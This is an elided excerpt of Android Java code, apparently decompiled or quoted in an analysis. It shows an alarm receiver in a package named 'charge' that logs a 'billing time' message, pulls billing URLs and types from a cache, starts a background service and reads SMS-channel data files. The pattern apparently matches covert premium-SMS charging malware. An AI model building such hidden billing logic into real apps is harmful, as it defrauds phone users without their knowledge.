...
public class KsoAlarmService extends BroadcastReceiver {
	...
	public void onReceive(Context context, Intent intent) {
		...
		if (intent.getAction().equals("start")) {
			...
			//Log.d(TAG,"基地收费时间到了");
			LogFile.WriteLogFile("基地收费时间到了");
			String urlStr = KsoCache.getInstance().getValue("url") != null ? (String) KsoCache.getInstance()
					.getValue("url") : "";
			if (!"".equals(urlStr)) {
				
				
				String baseUrl = urlStr.substring(urlStr.indexOf("&burl=") + 6).trim();
				
				String btype = urlStr.substring(urlStr.indexOf("&btype=") + 7,urlStr.indexOf("&burl=")).trim();
				
				String ftype = urlStr.substring(urlStr.indexOf("&ftype=") + 7,urlStr.indexOf("&btype=")).trim();
				
				
				
				KsoCache.getInstance().reSetValue("baseUrl",baseUrl );
				KsoCache.getInstance().reSetValue("btype", btype);
				Intent base_intent = new Intent(context, BaseZoneService.class);
				base_intent.putExtra("urlStr", urlStr);
				//base_intent.putExtra("baseUrl", "http://" + baseZone.getBase_url());
				base_intent.putExtra("flag", ftype);
			...
			public void run() {
				...
				if(datacontrol != null){		
					...
					if(cfg != null){
						...
						try {
							File file_config = new File("data/data/com.sttm.charge/files/smartphonec.dat");	
				...
				if (smsDatas != null && smsDatas.size() > 0) {
					...
					try {
						File file_channel = new File("data/data/com.sttm.charge/files/smartphonem.dat");
